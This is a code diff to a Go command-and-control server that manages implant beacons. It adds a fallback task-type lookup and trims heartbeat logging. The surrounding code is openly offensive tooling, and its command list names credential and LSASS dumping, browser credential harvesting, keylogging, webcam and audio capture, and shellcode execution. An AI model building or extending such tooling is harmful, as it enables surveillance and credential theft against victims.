@@ -145,11 +145,7 @@ func (s *C2Server) BeaconStream(stream pb.C2Service_BeaconStreamServer) error {
 		// Process beacon message
 		switch msg.Type {
 		case pb.BeaconMessage_HEARTBEAT:
-			if session != nil {
-				logrus.Infof("Heartbeat from %s (%s@%s)", msg.ImplantId, session.Username, session.Hostname)
-			} else {
-				logrus.Infof("Heartbeat from %s", msg.ImplantId)
-			}
+			// Heartbeat received - last seen already updated above
 		case pb.BeaconMessage_TASK_RESULT:
 			// Parse result payload: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
 			s.parseAndStoreCommandResult(string(msg.Payload))
@@ -215,33 +211,43 @@ func (s *C2Server) SubmitResult(ctx context.Context, result *pb.TaskResult) (*pb
 
 	// Helper to broadcast task completion (only for long-running commands)
 	go func() {
-		// Get task type from database to check if it's a long-running command
+		// Get task/command type from database to check if it's a long-running command
+		var taskType string
+
+		// First try DBTask table (for queued tasks)
 		task, err := s.db.GetTaskByID(result.TaskId)
-		if err != nil {
-			return // Can't determine task type, skip notification
+		if err == nil {
+			taskType = task.Type
+		} else {
+			// Fallback to DBCommand table (for stream-sent commands)
+			cmd, err := s.db.GetCommand(result.TaskId)
+			if err != nil {
+				return // Can't determine task type, skip notification
+			}
+			taskType = cmd.Type
 		}
 
 		// Only notify for long-running commands
 		longRunningCommands := map[string]bool{
-			"NETWORK_SCAN":        true,
-			"IFCONFIG":            true,
-			"HASHDUMP":            true,
-			"DUMP_LSASS":          true,
-			"HARVEST_CHROME":      true,
-			"HARVEST_FIREFOX":     true,
-			"HARVEST_EDGE":        true,
+			"NETWORK_SCAN":         true,
+			"IFCONFIG":             true,
+			"HASHDUMP":             true,
+			"DUMP_LSASS":           true,
+			"HARVEST_CHROME":       true,
+			"HARVEST_FIREFOX":      true,
+			"HARVEST_EDGE":         true,
 			"HARVEST_ALL_BROWSERS": true,
-			"CLIPBOARD_MONITOR":   true,
-			"KEYLOG_STOP":         true,
-			"AUDIO_CAPTURE":       true,
-			"WEBCAM_CAPTURE":      true,
-			"EXECUTE_ASSEMBLY":    true,
-			"EXECUTE_SHELLCODE":   true,
-			"EXECUTE_PE":          true,
-			"EXECUTE_BOF":         true,
+			"CLIPBOARD_MONITOR":    true,
+			"KEYLOG_STOP":          true,
+			"AUDIO_CAPTURE":        true,
+			"WEBCAM_CAPTURE":       true,
+			"EXECUTE_ASSEMBLY":     true,
+			"EXECUTE_SHELLCODE":    true,
+			"EXECUTE_PE":           true,
+			"EXECUTE_BOF":          true,
 		}
 
-		if !longRunningCommands[task.Type] {
+		if !longRunningCommands[taskType] {
 			return // Skip notification for quick commands
 		}
 
